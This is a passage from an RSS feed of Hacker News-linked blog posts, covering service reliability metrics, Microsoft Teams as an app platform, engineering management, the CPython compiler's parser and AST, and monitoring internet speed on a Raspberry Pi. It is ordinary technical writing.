major software companies will boast of “five nines,” or 99.999% uptime—but never 100%<br></p><p>Moreover, users will tolerate or even fail to notice downtime in some areas of your service. Development resources devoted to improving availability beyond expectations won’t increase customer happiness. Your service’s maintainability might need these resources instead.&nbsp;</p><h3>Maintainability</h3><p>Another major building block of reliability is <strong>maintainability</strong>. Maintainability factors into availability by describing how downtime originates and is resolved. When an incident causing downtime occurs, maintainable services can be repaired quickly. The sooner the incident is resolved, the sooner the service becomes available again.<br></p><p>There are two major components of maintainability: proactive and reactive.&nbsp;<br></p><ul role="list"><li><strong>Proactive maintainability</strong> involves building a codebase that can be easily understood and changed. As development progresses, issues will arise from incompatibility with existing code. If engineers are writing “<a href="https://en.wikipedia.org/wiki/Spaghetti_code">spaghetti code</a>” instead of prioritizing maintainability, issues are likely to occur and be difficult to find and solve. Proactive maintenance also includes procedures such as quality assurance and testing.<br></li></ul><ul role="list"><li><strong>Reactive maintainability</strong> describes a service’s ability to be repaired after incidents. This is influenced by a service's incident response procedures. As incidents are inevitable, <a href="https://www.blameless.com/blog/great-incident-response-3-components">great incident response</a> and guardrails are a necessity. If incident response procedures are reliable, teams will resolve incidents quickly. Proper incident responses also foster learning to reduce recurrence. A highly maintainable service allows engineers to implement these lessons effectively<br></li></ul><p>Maintainability is reflected in availability metrics. Shortening downtime in length or frequency results in higher availability. But, maintainability isn't only a means to an end for availability. Taking that approach can result in poorly allocated development resources. Investing in maintainability may not immediately result in better uptime. When you refactor old code to resolve technical debt, the service will function the same as before, with the same availability. It isn’t until incidents occur that you’ll see the benefits of this higher maintainability. Maintainability should be thought of as an investment in reliability, rather than just a component of availability.</p><h3>Reliability</h3><p>Reliability can be defined as the likelihood of a service functioning as expected when accessed by a user. This may seem identical to how we defined availability, but there are key differences. Availability looks at whether the service is working, whether a user is accessing it or not. If users accessed the service uniformly across all features and at all times, availability would determine reliability. This is generally never the case. Consider two services:<br></p><p><strong>Service A:</strong></p><ul role="list"><li>User log-on page has 97% availability</li><li>Catalog search has 97% availability</li><li>Site settings page has 97% availability<br></li></ul><p><strong>Service B:</strong></p><ul role="list"><li>User log-on page has 99% availability</li><li>Catalog search has 98% availability</li><li>Site settings page has 90% availability<br></li></ul><p>Just looking at the metric of availability, Service A wins out. But if the log-on page is used by 100% of users, the catalog search by 90% of users, and the site settings page by only 30% of users, Service B will be perceived as more reliable. Reliability accounts for actual usage, converting availability metrics into a measure of customer happiness.<br></p><p>By understanding the reliability of a system, development can avoid wasting time improving availability beyond what the customer can appreciate. <a href="https://www.blameless.com/blog/slis-understand-users-needs">Service level indicators</a> bundle metrics such as latency and availability into a more impactful measurement. Then, <a href="https://www.blameless.com/blog/service-level-objectives-slos-lessons-learned">service level objectives</a> can be set at the threshold for customers becoming dissatisfied. This approach looks at reliability from the perspective of customers. How they perceive the reliability of the service is more important than its availability.<br></p><p>Maintainability can also be evaluated through this lens. The time spent responding to incidents drains a service's error budget for uptime.. SLIs and SLOs can help allocate development efforts to improving the maintainability and incident response procedures most impacting customer happiness.<br></p><p>Here is a table summarizing the distinctions between availability, maintainability, and reliability:</p><figure id="w-node-f882187c6816-359a5214"><p><img src="https://uploads-ssl.webflow.com/5ec0224560bd6a6ef89a51ae/5f625dd5c056a2f2960b4f83_blog_table_avail-maintain-reliability_v1.jpg" loading="lazy" alt=""></p></figure><p>‍<br></p><div><p>Reliability isn’t only a collection of metrics or a quality of your codebase. It’s a big-picture concept, incorporating the perspective of the users, the inevitability of change and growth, and the humans developing your code. This holistic approach is the foundation of SRE, a collection of practices and cultural lessons that improve your service's reliability.</p><p>Blameless helps take your reliability solution to the next level. Understand the impact of your availability metrics, improve incident response with better collaboration and retrospectives, and focus development with SLOs and error budgets. If you want to thrive in the era of SRE, learn the basics by checking out our <a href="https://www.blameless.com/resources/bi-weekly-live-demo-of-blameless">bi-weekly live demo</a>.</p></div></div></div>]]>
            </description>
            <link>https://www.blameless.com/blog/availability-maintainability-reliability-whats-the-difference</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540809</guid>
            <pubDate>Mon, 21 Sep 2020 07:38:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft Teams as a Platform]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 104 (<a href="https://news.ycombinator.com/item?id=24540799">thread link</a>) | @homarp
<br/>
September 21, 2020 | https://jukkaniiranen.com/2020/09/microsoft-teams-as-a-platform/ | <a href="https://web.archive.org/web/*/https://jukkaniiranen.com/2020/09/microsoft-teams-as-a-platform/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article aria-label="Microsoft Teams as a platform" itemref="hero-page-title"><div>
<p>2020 became the year of #WFH (work from home) and for many organizations also the turning point when Microsoft Teams became the primary place where being “at work” happens. This is accelerating the evolution of Teams from being merely a communication tool that connects human beings into a foundational service layer for many types of business applications.</p>



<p>How the concept of Teams as a platform contrasts with Microsoft’s Power Platform suite of technology is something I’ve been thinking about a lot lately. In this post I’ll first reflect on the relatively short history of where Teams came from. I’ll then examine how the recent feature announcements are brining apps front &amp; center in Teams. Finally, a few words on the possible future for Teams as part of Microsoft’s broader strategy.</p>



<h2>The road that lead to Teams</h2>



<p>Looking back ~10 years, the real-time communication &amp; instant messaging tools from MS seemed to be going through an endless renaming cycle: from OCS to Lync to Skype for Business. The core feature set presented to the end user didn’t seem to evolve nearly as much as product branding did. On a broader level, the communication activities of information workers within an organization still typically took place within Outlook’s inbox, and different servers like SharePoint and Dynamics CRM all packed their own features for posting short messages to other users.</p>



<figure></figure>



<p>4 years ago, when the first images of what was then called “Skype Teams” started to leak out, we were already waiting for MS to create something a bit more ambitious than just another online meeting tool. Office Groups had began to emerge in various different places inside the MS Cloud, but they were primarily a technical construct with no sensible UX for everyday people to approach them. Even Dynamics CRM had it’s own solution that attempted to bring together the dicussion, calendars, notes, documents and team memberships from under an Office 365 Group associated with a record like account or opportunity:</p>



<div><figure><a href="https://docs.microsoft.com/en-us/dynamics365/customerengagement/on-premises/basics/collaborate-with-colleagues-using-office-365-groups" target="_blank" rel="noopener noreferrer"><img src="https://docs.microsoft.com/en-us/dynamics365/customerengagement/on-premises/basics/media/office-groups-dashboard.png" alt=""></a></figure></div>



<p>I remember having many discussions with our CRM customers where I attempted to steer people away from deploying this Groups solution. Instead I wanted to encourage them to wait for something a bit more polished that I knew had to be on it’s way sooner or later.</p>



<p>At one point there was a clear &amp; present danger of another “Yammer moment” taking place, as Microsoft was reportedly quite serious about their plans to acquire Slack. In retrospect it was a blessing for both parties that MS decided to keep investing in building their own product, instead of trying to retrofit an established service like Slack into their existing software offering.</p>



<p>I would argue that this “build over buy” strategy which Microsoft has since then followed across their business software stack has been a key success factor for BizApps in particular.  It has enabled MS to move from merely chasing CRM competitors like Salesforce into redefining the business apps playing field with Power Platform. There’s a stark difference between acquiring companies and bundling them as “X Cloud” versus engineering your own software stack to act as a true platform.</p>



<h2>Teams: the collaboration chapter</h2>



<p>Initially the first version of the Microsoft Teams product that became generally available in Spring 2017 was pretty much focused on being three things: </p>



<ol><li>Replacement for Skype for Business</li><li>Alternative to Slack</li><li>UI layer for Office 365 Groups</li></ol>



<p>From a business applications perspective there wasn’t all that much you could do to hook Teams up with Dynamics 365, until Fall 2018 when the previews for the first integrated features were launched. In particular the integrated file sharing experience that Teams offered seemed almost like the Holy Grail for many CRM professionals, offering to fix the glaring hole in the SharePoint integration story that lacked any security model synchronization. The roadmap image below presents the plans from 2 years ago on how Teams and Dynamics 365 were going to be integrated:</p>



<figure></figure>







<p>The last item on the roadmap has still not been delivered, which is the visibility of Teams conversations inside the Dynamics 365 record form. Why this hasn’t been a higher priority for MS to implement seems to me like a sign of how Microsoft Teams is nowadays positioned as the primary UI for all information work. MS probably would prefer if everything always started from inside Teams. You pin record tabs into channels, you show previews of records inside teams discussions, you interact with records via bot interfaces and so on. As long as Teams is that big umbrella under which all work takes place.</p>



<p>The lack of a deep 2-way integration does not therefore mean that investments aren’t being made into the products involved. It can simply be a reflection of the new vision that is being built, by aligning many existing services to form a whole that aims to be greater than the sum of its parts.</p>



<p>As an example, if you look at Microsoft’s task management story, you’ll see that features and data from across various apps like To Do, Planner and Outlook tasks / flagged emails are currently being collapsed into a central location that is the <a href="https://docs.microsoft.com/en-us/microsoftteams/manage-tasks-app" target="_blank" rel="noreferrer noopener">Tasks app for Teams</a>. Tasks as a generic construct don’t necessarily need to be fully controlled by a single database, yet they very much need to be logically represented within “the hub for teamwork” that Teams is positioned as.</p>



<p>Going forward, when new apps appear into the MS cloud product portfolio and they need to offer task management features to users, the logical integration point to focus on would be Teams. For activity feed type of functionality the choice is even more clear for product development: choose to piggyback on Teams instead of inventing yet another stream of short messages.</p>



<h2>Teams: the platform chapter</h2>



<p>Moving beyond simply integrating Teams with products X, Y and Z, we’re now seeing the rise of a model where apps are built specifically to be used in Teams. This has of course been possible for a long time already, by developing custom web services and using the SDKs. Now there are many features coming up that will amplify the platform story around Teams on the no-code/low-code front specifically.</p>



<figure><img src="https://techcommunity.microsoft.com/t5/image/serverpage/image-id/215495iAC8095B3BF8D5E46/image-size/large?v=1.0&amp;px=999" alt="lists in teams1.png"></figure>



<p>Microsoft Lists app has been the  first to <a href="https://techcommunity.microsoft.com/t5/microsoft-teams-blog/microsoft-lists-in-microsoft-teams-is-now-generally-available/ba-p/1621979" target="_blank" rel="noreferrer noopener">reach GA</a> and offers an ultra low barrier for users to process data in a single table through a configurable, readymade UI. When accessed via Teams, the list data gains one more special dimension: discussions to be had regarding a list item. This is pretty much the same as the usage pattern offered for a Dynamics 365 record with the integration mentioned earlier.</p>



<p>Underneath the new covers of MS Lists is the technology familiar from SharePoint lists. If we were to only examine the UI layer, there is actually a remarkable similarity to a popular no-code service called Airtable. So much that the <a rel="noreferrer noopener" href="https://mspoweruser.com/airtable-accuses-microsoft-of-copying-its-service/" target="_blank">accusations</a> of MS simply copying the visuals and core features from this competitor don’t seem entirely unjustified. </p>



<figure><img loading="lazy" src="https://jukkaniiranen.com/wp-content/uploads/2020/09/Airtable_for_teams.png" alt="" width="583" height="729" srcset="https://jukkaniiranen.com/wp-content/uploads/2020/09/Airtable_for_teams.png 777w, https://jukkaniiranen.com/wp-content/uploads/2020/09/Airtable_for_teams-240x300.png 240w, https://jukkaniiranen.com/wp-content/uploads/2020/09/Airtable_for_teams-768x961.png 768w" sizes="(max-width: 583px) 100vw, 583px"></figure>



<p>Comparing these two offerings gives us some perspective on what exactly is the market position these tools are aiming to conquer. Simple lists themselves are not a particularly unique feature, rather it’s the team collaboration capabilities and ease of data sharing that turns these tables into what you’d call an actual app. Incidentally, just this week Airtable <a href="https://blog.airtable.com/airtable-platform-launch-automations-sync-apps/" target="_blank" rel="noreferrer noopener">announced</a> they were building a full platform with apps offering JavaScript based extensibility, a marketplace for sharing apps, automations for executing business logic, and finally a sync service to transfer data across environments (“bases”).</p>



<p>Collaboration scenarios around semi-structured data like lists and Excel style tables can be seen as a  gateway drug. They allow turning email or paper based manual processes into a quick first draft of what the digital process could be like. If there are indeed clear business benefits in automating the said process, the requirements for more complex app features will soon begin to emerge from the user base. Hence the collaboration platform should offer an obvious path to grow these pre-built app experiences into more advanced no-code/low-code apps.</p>



<h2>Project Oakdale a.k.a bringing CDS to Teams</h2>



<p>If Microsoft Lists is the equivalent of an Excel table within the Teams context, then <a href="https://jukkaniiranen.com/2020/07/dataflex-is-more-and-less-than-cds/">Project Oakdale</a> / “CDS Lite” could be though of as bringing SQL Server inside Teams. Now, obviously Microsoft has zero intent on actually replacing Excel nor SQL with features built into Teams. They only need to introduce those parts that make sense from a team collabocation perspective.</p>



<p>Microsoft Lists is a far cry from what a real Excel workbook can do, yet it can offer much more value in a collaboration scenarios that those lone .xlsx files ever could. Similarly, the version of CDS that will very soon be available for building Power Apps within Teams is nowhere near as powerful as the services powering enterprise CRM systems like Dynamics 365 (or the raw power offered by SQL). Still, the fact that it can be found from within every team and used by a much larger audience than what Power Apps citizen developer tools could hope to capture – those are the factors that can truly make CDS a mainstream service that most information workers in the Microsoft 365 cloud interact it.</p>



<figure><img loading="lazy" width="1024" height="576" src="https://jukkaniiranen.com/wp-content/uploads/2020/09/Oakdale_Teams_table_design-1024x576.jpg" alt="" srcset="https://jukkaniiranen.com/wp-content/uploads/2020/09/Oakdale_Teams_table_design-1024x576.jpg 1024w, https://jukkaniiranen.com/wp-content/uploads/2020/09/Oakdale_Teams_table_design-300x169.jpg 300w, https://jukkaniiranen.com/wp-content/uploads/2020/09/Oakdale_Teams_table_design-768x432.jpg 768w, https://jukkaniiranen.com/wp-content/uploads/2020/09/Oakdale_Teams_table_design.jpg 1200w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The experience of defining the CDS data model in Project Oakdale will be very different from the path that Power Apps makers have gone through – let alone the XRM veterans. In fact, you could easily mistake the table design and row entry UX to be that of Microsoft Lists rather than CDS. This highlights a key aspect that not all Power Platform experts may yet have grasped: for MS this “CDS Lite” is not so much about deciding what premium features of the full Power Platform to give away for free to Teams subscibers – rather it’s about how to best simplify the enterprise CRM features of CDS into a new product that Teams users could adopt on their own.</p>



<p>This doesn’t mean that …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jukkaniiranen.com/2020/09/microsoft-teams-as-a-platform/">https://jukkaniiranen.com/2020/09/microsoft-teams-as-a-platform/</a></em></p>]]>
            </description>
            <link>https://jukkaniiranen.com/2020/09/microsoft-teams-as-a-platform/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540799</guid>
            <pubDate>Mon, 21 Sep 2020 07:36:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What do good Engineering Managers do? They taste the soup]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24540624">thread link</a>) | @liveweird
<br/>
September 21, 2020 | https://no-kill-switch.ghost.io/what-do-good-engineering-managers-do-they-taste-the-soup/ | <a href="https://web.archive.org/web/*/https://no-kill-switch.ghost.io/what-do-good-engineering-managers-do-they-taste-the-soup/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article data-post-id="5f665b145e15b200392aedb9">
	

	<section>
		<p>Sometimes you encounter a striking figure of speech, comparison or just a metaphor that illustrates some concept in a much better way than anything you knew until now. It's so good you can't let it get unnoticed. In my case, it happened e.g. when I've learned to think about architects as "navigators". Or quite recently, while I was reading a very decent book by <a href="https://twitter.com/rands">Michael Lopp</a> - <a href="https://www.goodreads.com/book/show/50083106-the-art-of-leadership">"The Art of Leadership: Small Things, Done Well"</a>.</p><p>Speaking about the latter: my epiphany moment happened during chapter IV, entirely dedicated to the author's actionable advice for engineering leaders. The concluding one was about a reasonable alternative to micro-management: Lopp calls it ... <em>"tasting the soup"</em>. And I think it's brilliant and 100% spot-on.</p><p><strong>Tasting the soup</strong> - what does it mean?</p><p>Imagine a professional chef. A chief boss-cook. A reigning monarch of the kitchen (e.g. in a top-notch, highly reputed, Michelin-starred restaurant). (S)he is the person accountable for the quality of the holistic culinary experience here. It's his(/her) reputation at stake if customers are dissatisfied (for any reason). But still, it doesn't mean (s)he does all the job him(/her)self (to guarantee a suitable level of quality) - quite the opposite. There's the talented, hand-picked crew doing all the "dirty" work, while the chef-in-charge:</p><ul><li>tastes</li><li>probes</li><li>verifies</li></ul><p>It's not that (s)he cares only about the final outcome - the 100% ready dish. (S)he engages <u>at all the various stages</u> (of meal preparation): by inspecting raw materials, half-cooked ingredients, nearly ready products about to get the final touch. &nbsp;What's more - the soup is <u>"multi-dimensional"</u> - it has several equally important aspects (to assess separately): consistency, smell, color, temperature, sweetness, bitterness, spiciness, etc.</p><p>Needless to say - the chef can't (&amp; shouldn't) be everywhere, all the time. (S)he <strong>can't assist every elementary activity</strong> - which is good and ... desirable. One <u>should not judge</u> the effect by the activities performed (which are - in many cases - meaningful "implementation" details or just elements of a highly-individualized style) but <strong>by the outcomes and how they match expectations </strong>(stated beforehand).</p><p>That's why (s)he restrains her(/him)self <u>to taste and probe</u> - it's sufficient because of <strong>past, practical experience</strong>. Precisely because of her/his experience, (s)he knows what to expect, whether the chosen direction is correct, whether there's a chance the final product will be edible &amp; satisfactory (aka will meet the given success criteria). (S)he's been there, (s)he's seen that. And as the one who knows what to expect, the chef is more probably able to detect all those very early warning lights and propose corrective actions.</p><p>Let me emphasize it again - micro-managing all the actions is not the way. Even with experience - <strong>it's NOT possible to know all the correct paths</strong>. Never ever. The number (of correct, good enough options) is endless.</p><p>I hope you've already figured it out by yourself - this chef soup tasting story can be easily mapped onto engineering management scenarios. Everything that has been said about the chef above can be directly translated into software development leaders' reality — starting with the role of experience and the importance of probing the effects (the current state of - process, tooling, various stages of deliverable completeness).</p><p>The default mode of an engineering manager's work should NOT be to dive deep into every possible (implementation) detail - it's just not feasible (but necessary in carefully chosen, critical situations that demand a more direct approach because of some warning lights flashing). A good engineering manager has to be able to:</p><ul><li>quickly orient her(/him)self in a situational context</li><li>identify the qualities that need to be assessed at this point</li><li>find a way to inspect them efficiently and objectively</li><li>confront the perceived learnings with expectations and past experience of similar endeavors</li></ul><p>In other words - to <em>"taste the engineering soup"</em>.</p><p>I think this metaphor is useful not just in calibrating your efforts (as an engineer manager), but also (as it's very "visual") can be very helpful in clarifying the meaning and importance of the engineering manager role: why is it needed, what value does it provide and what kind of input can one expect from a person bearing such a role.</p>
	</section>

	
</article></div>]]>
            </description>
            <link>https://no-kill-switch.ghost.io/what-do-good-engineering-managers-do-they-taste-the-soup/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540624</guid>
            <pubDate>Mon, 21 Sep 2020 07:05:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How the CPython compiler works]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24540490">thread link</a>) | @r4victor
<br/>
September 20, 2020 | https://tenthousandmeters.com/blog/python-behind-the-scenes-2-how-the-cpython-compiler-works/ | <a href="https://web.archive.org/web/*/https://tenthousandmeters.com/blog/python-behind-the-scenes-2-how-the-cpython-compiler-works/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<!-- /.post-info -->      <h3>Today's subject</h3>
<p>In <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/">the first post</a> of the series we've looked at the CPython VM. We've learned that it works by executing a series of instructions called bytecode. We've also seen that Python bytecode is not sufficient to fully describe what a piece of code does. That's why there exists a notion of a code object. To execute a code block such as a module or a function means to execute a corresponding code object. A code object contains block's bytecode, constants and names of variables used in the block and block's various properties.</p>
<p>Typically, a Python programmer doesn't write bytecode and doesn't create the code objects but writes a normal Python code. So CPython must be able to create a code object from a source code. This job is done by the CPython compiler. In this part we'll explore how it works.</p>
<p><strong>Note</strong>: In this post I'm referring to CPython 3.9. Some implementation details will certainly change as CPython evolves. I'll try to keep track of important changes and add update notes.</p>
<h3>What CPython compiler is</h3>
<p>We understood what the responsibilities of the CPython compiler are, but before looking at how it is implemented, let's figure out why we call it a compiler in the first place?</p>
<p>A compiler, in its general sense, is a program that translates a program in one language into an equivalent program in another language. There are many types of compilers, but most of the times by a compiler we mean a static compiler, which translates a program in a high-level language to a machine code. Does the CPython compiler have something in common with this type of a compiler? To answer this question, let's take a look at the traditional three-stage design of a static compiler.</p>
<p><img src="https://tenthousandmeters.com/blog/python_bts_02/diagram1.png" alt="diagram1"></p>
<p>The frontend of a compiler transforms a source code into some intermediate representation (IR). The optimizer then takes an IR, optimizes it and passes an optimized IR to the backend that generates machine code. If we choose an IR that is not specific to any source language and any target machine, then we get a key benefit of the three-stage design: for a compiler to support a new source language only an additional frontend is needed and to support a new target machine only an additional backend is needed.</p>
<p>The LLVM toolchain is a great example of a success of this model. There are frontends for C, Rust, Swift and many other programming languages that rely on LLVM to provide more complicated parts of the compiler. LLVM's creator, Chris Lattner, gives a good <a href="http://aosabook.org/en/llvm.html">overview of its architecture</a>.</p>
<p>CPython, however, doesn't need to support multiple source languages and target machines but only a Python code and the CPython VM. Nevertheless, CPython compiler is an implementation of the three-stage design. To see why, we should examine the stages of a three-stage compiler in more detail. </p>
<p><img src="https://tenthousandmeters.com/blog/python_bts_02/diagram2.png" alt="diagram1"></p>
<p>The picture above represents a model of a classic compiler. Now compare it to the architecture of the CPython compiler in the picture below.</p>
<p><img src="https://tenthousandmeters.com/blog/python_bts_02/diagram3.png" alt="diagram1"></p>
<p>Looks similar, isn't it? The point here is that the structure of the CPython compiler should be familiar to anyone who studied compilers before. If you didn't, a famous <a href="https://en.wikipedia.org/wiki/Compilers:_Principles,_Techniques,_and_Tools">Dragon Book</a> is an excellent introduction to the theory of compiler construction. It's long, but you'll benefit even by reading only the first few chapters.</p>
<p>The comparison we've made requires several comments. First, since version 3.9, CPython uses a new parser by default that outputs an AST (Abstract Syntax Tree) straight away without an intermediate step of building a parse tree. Thus, the model of the CPython compiler is simplified even further. Second, some of the presented phases of the CPython compiler do so little compared to their counterparts of the static compilers that some may say that the CPython compiler is no more than a frontend. We won't take this view of the hardcore compiler writers.</p>
<h3>Overview of the compiler's architecture</h3>
<p>The diagrams are nice, but they hide many details and can be misleading, so let's spend some time discussing the overall design of the CPython compiler.</p>
<p>The two major components of the CPython compiler are:</p>
<ol>
<li>the frontend; and</li>
<li>the backend.</li>
</ol>
<p>The frontend takes a Python code and produces an AST. The backend takes an AST and produces a code object. Throughout the CPython source code the terms parser and compiler are used for the frontend and the backend respectively. This is yet another meaning of the word compiler. It was probably better to call it something like a code object generator, but we'll stick with the compiler since it doesn't seem to cause much trouble.</p>
<p>The job of the parser is to check whether the input is a syntactically correct Python code. If it's not, then the parser reports an error like the following:</p>
<div><pre><span></span><span>x</span> <span>=</span> <span>y</span> <span>=</span> <span>=</span> <span>12</span>
        <span>^</span>
<span>SyntaxError</span><span>:</span> <span>invalid</span> <span>syntax</span>
</pre></div>


<p>If the input is correct, then the parser organizes it according to the rules of the grammar. A grammar defines the syntax of a language. The notion of a formal grammar is so crucial for our discussion that, I think, we should digress a little to remember its formal definition.</p>
<p>According to the classic definition, a grammar is a tuple of four items:</p>
<ul>
<li><span>\(\Sigma\)</span> – a finite set of terminal symbols, or simply terminals (usually denoted by lowercase letters).</li>
<li><span>\(N\)</span> – a finite set of nonterminal symbols, or simply nonterminals (usually denoted by uppercase letters).</li>
<li><span>\(P\)</span> – a set of production rules. In the case of context-free grammars, which include the Python grammar, a production rule is just a mapping from a nonterminal to any sequence of terminals and nonterminals like <span>\(A \to aB\)</span>.</li>
<li><span>\(S\)</span> – one distinguished nonterminal.</li>
</ul>
<p>A grammar defines a language that consists of all sequences of terminals that can be generated by applying production rules. To generate some sequence, one starts with the symbol <span>\(S\)</span> and then recursively replaces each nonterminal with a sequence according to production rules until the whole sequence consists of terminals. Using established convention for the notation, it's sufficient to list production rules to specify the grammar. Here is, for example, a simple grammar that generates sequences of alternating ones and zeros:</p>
<p><span>\(S \to 10S \;| \;10\)</span></p>
<p>We'll continue to discuss grammars when we look at the parser in more detail.</p>
<h3>Abstract syntax tree</h3>
<p>The ultimate goal of the parser is to produce an AST. An AST is a tree data structure that serves as a high-level representation of a source code. Here's an example of a piece of code and a dump of the corresponding AST produced by the standard <a href="https://docs.python.org/3/library/ast.html"><code>ast</code></a> module:</p>



<div><pre><span></span>$ python -m ast example1.py
Module(
   body=[
      Assign(
         targets=[
            Name(id='x', ctx=Store())],
         value=Constant(value=123)),
      Expr(
         value=Call(
            func=Name(id='f', ctx=Load()),
            args=[
               Name(id='x', ctx=Load())],
            keywords=[]))],
   type_ignores=[])
</pre></div>


<p>The types of the AST nodes are formally defined using <a href="https://www.cs.princeton.edu/research/techreps/TR-554-97">the Zephyr Abstract Syntax Definition Language</a> (ASDL). The ASDL is a simple declarative language that was created to describe tree-like IRs, which is what the AST is. Here is the definitions of the <code>Assign</code> and <code>Expr</code> nodes from <a href="https://github.com/python/cpython/blob/master/Parser/Python.asdl">Parser/Python.asdl</a>:</p>
<div><pre><span></span>stmt = ... | Assign(expr* targets, expr value, string? type_comment) | ...
expr = ... | Call(expr func, expr* args, keyword* keywords) | ...
</pre></div>


<p>The ASDL specification should give us an idea of what the Python AST looks like. The parser, however, needs to represent an AST in the C code. Fortunately, it's easy to generate the C structs for the AST nodes from their ASDL descriptions. That's what CPython does, and the result looks like this:</p>
<div><pre><span></span><span>struct</span> <span>_stmt</span> <span>{</span>
    <span>enum</span> <span>_stmt_kind</span> <span>kind</span><span>;</span>
    <span>union</span> <span>{</span>
        <span>// ... other kinds of statements</span>
        <span>struct</span> <span>{</span>
            <span>asdl_seq</span> <span>*</span><span>targets</span><span>;</span>
            <span>expr_ty</span> <span>value</span><span>;</span>
            <span>string</span> <span>type_comment</span><span>;</span>
        <span>}</span> <span>Assign</span><span>;</span>
        <span>// ... other kinds of statements</span>
    <span>}</span> <span>v</span><span>;</span>
    <span>int</span> <span>lineno</span><span>;</span>
    <span>int</span> <span>col_offset</span><span>;</span>
    <span>int</span> <span>end_lineno</span><span>;</span>
    <span>int</span> <span>end_col_offset</span><span>;</span>
<span>};</span>

<span>struct</span> <span>_expr</span> <span>{</span>
    <span>enum</span> <span>_expr_kind</span> <span>kind</span><span>;</span>
    <span>union</span> <span>{</span>
        <span>// ... other kinds of expressions</span>
        <span>struct</span> <span>{</span>
            <span>expr_ty</span> <span>func</span><span>;</span>
            <span>asdl_seq</span> <span>*</span><span>args</span><span>;</span>
            <span>asdl_seq</span> <span>*</span><span>keywords</span><span>;</span>
        <span>}</span> <span>Call</span><span>;</span>
        <span>// ... other kinds of expressions</span>
    <span>}</span> <span>v</span><span>;</span>
    <span>// ... same as in _stmt</span>
<span>};</span>
</pre></div>


<p>An AST is a handy representation to work with. It tells what a program does, hiding all non-essential information such as indentation, punctuation and other Python's syntactic features.</p>
<p>One of the main beneficiaries of the AST representation is the compiler, which can walk an AST and emit bytecode in a relatively straightforward manner. Many Python tools, besides the compiler, use the AST to work with Python code. For example, <a href="https://github.com/pytest-dev/pytest/">pytest</a> makes changes to an AST to provide useful information when the <code>assert</code> statement fails, which by itself does nothing but raises an <code>AssertionError</code> if the expression evaluates to <code>False</code>. Another example is <a href="https://github.com/PyCQA/bandit">Bandit</a> that finds common security issues in Python code by analyzing an AST.</p>
<p>Now, when we've studied the Python AST a little bit, we can look at how the parser builds it from a source code.</p>
<h3>From source code to AST</h3>
<p>In fact, as I mentioned earlier, starting with version 3.9, CPython has not one but two parsers. The new parser is used by default. It's also possible to use the old parser by passing <code>-X oldparser</code> option. In CPython 3.10, however, the old parser will be completely removed.</p>
<p>The two parser are very different. We'll focus on the new one but before discuss the old parser as well.</p>
<h4>old parser</h4>
<p>For a long time the Python's syntax was formally defined by the generative grammar. It's a kind of grammar we've talked about earlier. It tells us how to generate sequences belonging to the language. The problem is that a generative grammar doesn't directly corresponds to the parsing algorithm that would be able to parse those sequences. Fortunately, smart people have been able to distinguish classes of generative grammars for which the corresponding parser can be built. These include <a href="https://en.wikipedia.org/wiki/Context-free_grammar">context free</a>, <a href="https://en.wikipedia.org/wiki/LL_grammar">LL(k),</a> <a href="https://en.wikipedia.org/wiki/LR_parser">LR(k)</a>, <a href="https://en.wikipedia.org/wiki/LALR_parser">LALR</a> and many …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://tenthousandmeters.com/blog/python-behind-the-scenes-2-how-the-cpython-compiler-works/">https://tenthousandmeters.com/blog/python-behind-the-scenes-2-how-the-cpython-compiler-works/</a></em></p>]]>
            </description>
            <link>https://tenthousandmeters.com/blog/python-behind-the-scenes-2-how-the-cpython-compiler-works/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24540490</guid>
            <pubDate>Mon, 21 Sep 2020 06:38:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Monitor your internet speed with a Raspberry Pi]]>
            </title>
            <description>
<![CDATA[
Score 21 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24540344">thread link</a>) | @perryizgr8
<br/>
September 20, 2020 | https://perryizgr8.github.io/raspberry-pi/2020/09/20/monitoring-speed-rpi.html | <a href="https://web.archive.org/web/*/https://perryizgr8.github.io/raspberry-pi/2020/09/20/monitoring-speed-rpi.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>While cleaning out some old cartons last weekend, I found my old Raspberry Pi Model B+. It is the first iteration of the Pi. It has a 700MHz ARM CPU and 512MB of RAM. It uses a micro-SD card for non-volatile storage. So as you can see, it is quite a capable little computer, and you can power it off a standard 5V USB charger, which means you can run it all the time without worrying about power consumption.</p>

<p>I decided to track my home internet speed to see if my ISP is ripping me off 😉. Here’s how I did it.</p>

<h2 id="measuring-speed-on-raspberry-pi">Measuring speed on Raspberry Pi</h2>
<p><a href="https://www.speedtest.net/">Speedtest.net</a> has an <a href="https://www.speedtest.net/apps/cli">official CLI client</a> that you can install directly using <code>apt</code>. It selects the best server automatically and reports the download and upload speed, along with the latency of your connection.</p>

<figure><pre><code data-lang="shell"><span>$ </span>speedtest-cli
Retrieving speedtest.net configuration...
Testing from ACT Fibernet <span>(</span>X.X.X.X<span>)</span>...
Retrieving speedtest.net server list...
Selecting best server based on ping...
Hosted by North East Dataa Network Pvt Ltd <span>(</span>Bangalore<span>)</span> <span>[</span>0.10 km]: 9.601 ms
Testing download speed................................................................................
Download: 83.85 Mbit/s
Testing upload speed................................................................................................
Upload: 60.37 Mbit/s</code></pre></figure>

<p>There is an option to get this info in json format, which is easier to parse.</p>

